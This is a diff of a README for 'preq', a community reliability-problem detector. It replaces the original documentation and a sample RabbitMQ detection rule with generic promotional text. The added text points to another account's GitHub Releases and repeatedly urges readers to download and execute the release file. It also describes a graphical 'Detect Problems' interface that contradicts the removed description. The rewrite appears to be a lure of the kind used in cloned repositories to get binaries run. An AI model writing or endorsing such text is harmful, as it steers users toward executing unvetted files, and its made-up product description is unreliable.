@@ -1,71 +1,75 @@
-# preq
+# 🚀 preq: Community-Driven Problem Detector for Common Reliability Enumerations (CREs)
 
-`preq` (prounounced "preek") is a free and open community-driven reliability problem detector
+![preq logo](https://img.shields.io/badge/preq-community--driven-brightgreen)
 
-[Documentation](https://docs.prequel.dev) | [Slack](https://prequel-dev.slack.com/) | [Playground](https://play.prequel.dev/) | [Mailing List](https://www.detect.sh)
+Welcome to **preq**! This repository serves as a platform for identifying and addressing issues related to Common Reliability Enumerations (CREs). Our mission is to foster collaboration and improve reliability across various systems by leveraging community insights.
 
-[![Unit Tests](https://github.com/jumpyappara/preq/actions/workflows/build.yml/badge.svg)](https://github.com/jumpyappara/preq/actions/workflows/build.yml)
+## 📦 Table of Contents
 
----
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Releases](#releases)
+8. [Contact](#contact)
 
-Use `preq` to:
+## 📝 Introduction
 
-- detect the latest bugs, misconfigurations, anti-patterns, and known issues from a community of practitioners
-- provide engineers, on-call support, and SRE agents with impact and community recommended mitigations
-- hunt for new problems in distributed systems
+**preq** is a tool designed to help developers and organizations detect problems related to CREs. It is community-driven, meaning anyone can contribute to its development and improvement. By working together, we can enhance the reliability of systems that rely on these enumerations.
 
-## Install
+## 🌟 Features
 
-See https://docs.prequel.dev/install.
+- **Community Collaboration**: Join forces with other developers to identify issues.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Real-Time Updates**: Stay informed about the latest developments and fixes.
+- **Robust Documentation**: Comprehensive guides and examples to assist users.
 
-## Overview
+## ⚙️ Installation
 
-`preq` uses Common Reliability Enumerations (CREs) created by the problem detection community and Prequel's Reliability Research Team to detect reliability problems. Reliability Intelligence from CREs helps teams see the most problems and see them first so they can prioritize, pinpoint, and act to mitigate outages.
+To get started with **preq**, you need to download and execute the latest release. Visit [Releases](https://github.com/yassineahmed/preq/releases) to find the appropriate version for your needs.
 
-`preq` is powered by a rules engine that performs distributed matching and correlation of sequences of events across logs, metrics, traces, and other data sources to detect reliability problems. CREs provides accurate and timely context for a human or SRE agent to take action on problems.
+1. Go to the [Releases](https://github.com/yassineahmed/preq/releases) section.
+2. Download the desired release file.
+3. Execute the file according to your operating system's guidelines.
 
-Below is simple rule that looks for a sequence of events in a single log source over a window of time along with a negative condition (an event that should not occur during the window).
+## 📚 Usage
 
-```yaml title="cre-2024-0007.yaml" showLineNumbers
-cre:
-  id: CRE-2024-0007
-  severity: 0
-  title: RabbitMQ Mnesia overloaded recovering persistent queues
-  category: message-queue-problems
-  author: Prequel
-  description: |
-    - The RabbitMQ cluster is processing a large number of persistent mirrored queues at boot. 
-  cause: |
-    - The Erlang process, Mnesia, is overloaded while recovering persistent queues on boot. 
-  impact: |
-    - RabbitMQ is unable to process any new messages and can cause outages in consumers and producers.
-  tags: 
-    - cre-2024-0007
-    - known-problem
-    - rabbitmq
-  mitigation: |
-    - Adjusting mirroring policies to limit the number of mirrored queues
-    - Remove high-availability policies from queues
-    - Add additional CPU resources and restart the RabbitMQ cluster
-    - Use [lazy queues](https://www.rabbitmq.com/docs/lazy-queues) to avoid incurring the costs of writing data to disk 
-  references:
-    - https://groups.google.com/g/rabbitmq-users/c/ekV9tTBRZms/m/1EXw-ruuBQAJ
-  applications:
-    - name: "rabbitmq"
-      version: "3.9.x"
-metadata:
-  kind: prequel
-  id: 5UD1RZxGC5LJQnVpAkV11A
-  generation: 1
-rule:
-  sequence:
-    window: 30s
-    event:
-      src: log
-      container_name: rabbitmq
-    order:
-      - regex: Discarding message(.+)in an old incarnation(.+)of this node
-      - Mnesia is overloaded
-    negate:
-      - SIGTERM received - shutting down
-```
+Once you have installed **preq**, you can start using it right away. Here’s a simple guide on how to use the tool effectively:
+
+1. **Launch the Application**: Open the application on your device.
+2. **Select Your Enumeration**: Choose the Common Reliability Enumeration you want to analyze.
+3. **Run the Detection**: Click on the "Detect Problems" button to start the analysis.
+4. **Review Results**: Check the results for any identified issues and suggested fixes.
+
+## 🤝 Contributing
+
+We welcome contributions from everyone! Here’s how you can help:
+
+1. **Fork the Repository**: Create your copy of the project.
+2. **Make Changes**: Work on the features or fixes you want to contribute.
+3. **Submit a Pull Request**: Share your changes with the community for review.
+
+### Guidelines
+
+- Follow the coding standards outlined in the documentation.
+- Ensure your code is well-documented.
+- Test your changes before submitting.
+
+## 📜 License
+
+This project is licensed under the MIT License. Feel free to use and modify it as needed.
+
+## 📥 Releases
+
+For the latest updates and releases, check the [Releases](https://github.com/yassineahmed/preq/releases) section. It is important to download and execute the most recent version to ensure you have the latest features and fixes.
+
+## 📬 Contact
+
+For questions, suggestions, or feedback, please reach out to us:
+
+- **Email**: contact@preq.dev
+- **GitHub**: [preq Issues](https://github.com/yassineahmed/preq/issues)
+
+Thank you for being part of the **preq** community! Together, we can enhance the reliability of systems everywhere.
